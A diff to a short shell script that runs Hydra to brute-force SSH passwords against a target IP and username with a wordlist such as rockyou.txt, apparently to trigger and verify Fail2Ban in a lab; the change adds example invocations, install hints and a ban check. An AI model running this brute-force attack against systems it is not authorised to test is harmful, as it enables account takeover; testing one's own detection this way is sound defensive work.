@@ -12,13 +12,15 @@
 # Usage:
 #   ./scripts/ssh_bruteforce_test.sh <TARGET_IP> <USERNAME> <WORDLIST>
 #
+# Examples:
+#   ./scripts/ssh_bruteforce_test.sh 192.168.50.245 secadmin ./wordlist.txt
+#   ./scripts/ssh_bruteforce_test.sh 192.168.50.245 secadmin /usr/share/wordlists/rockyou.txt
+#
 
 set -euo pipefail
 
 if [[ $# -lt 3 ]]; then
   echo "Usage: $0 <TARGET_IP> <USERNAME> <WORDLIST>"
-  echo "Example:"
-  echo "  $0 192.0.2.10 secadmin /usr/share/wordlists/rockyou.txt"
   exit 1
 fi
 
@@ -27,18 +29,23 @@ USERNAME="$2"
 WORDLIST="$3"
 
 if ! command -v hydra >/dev/null 2>&1; then
-  echo "[!] hydra is not installed. Install with: sudo apt install hydra"
+  echo "[!] hydra is not installed."
+  echo "    Install (Debian/Kali): sudo apt install -y hydra"
   exit 1
 fi
 
 if [[ ! -f "${WORDLIST}" ]]; then
   echo "[!] Wordlist not found: ${WORDLIST}"
+  echo "    Tip: Use a repo-local demo list, e.g. ./wordlist.txt"
   exit 1
 fi
 
 echo "[*] Launching Hydra SSH brute-force against ${TARGET} for user ${USERNAME}"
 echo "    This is intended to generate auth.log entries and trigger Fail2Ban."
+echo "    (Lab only. Expect a ban if fail2ban is active.)"
 
-hydra -l "${USERNAME}" -P "${WORDLIST}" ssh://"${TARGET}" -t 4 -V
+# -t controls parallelism; keep modest to avoid immediate server-side throttling noise
+hydra -l "${USERNAME}" -P "${WORDLIST}" ssh://"${TARGET}" -t 2 -V
 
-echo "[+] Hydra run complete. Check /var/log/auth.log and Fail2Ban status on the target."
+echo "[+] Hydra run complete."
+echo "    On the target: sudo fail2ban-client status sshd"
